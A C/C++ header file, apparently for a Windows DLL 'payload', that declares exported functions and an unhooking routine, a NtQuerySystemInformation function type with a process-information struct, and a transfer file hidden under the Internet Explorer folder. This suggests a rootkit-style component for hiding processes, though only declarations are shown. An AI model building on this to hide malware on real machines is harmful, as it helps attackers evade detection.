#ifndef PAYLOAD_H
#define PAYLOAD_H
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <Psapi.h>
#include <math.h>

#include "../Common/ArgumentsPassing.h"

#define MAX_LINE 500
#define MAX_COMMAND 100

//#define DEBUG_MODE


#define INFO_TRANSFER_FILE  "C:\\Program Files\\Internet Explorer\\mdsint.isf"
void InitializeDLL(pArgStruct args);
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
extern HANDLE hMutex;
extern bool isUp;
extern "C" __declspec(dllexport) wchar_t* WStringFunc();

extern "C" __declspec(dllexport) char* StringFunc();
extern "C" __declspec(dllexport) void VoidFunc();

#ifdef DEBUG_MODE
void PrintToFile(const char* s);
#endif
void UnhookDLL();
typedef NTSTATUS(__stdcall *PNtQueryFunc)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
#endif